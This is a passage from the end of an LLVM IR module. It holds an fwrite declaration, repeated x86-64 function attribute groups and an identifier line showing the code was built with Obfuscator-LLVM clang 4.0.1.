declare i64 @fwrite(i8* nocapture, i64, i64, %struct._IO_FILE* nocapture) #10

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { cold }
attributes #13 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
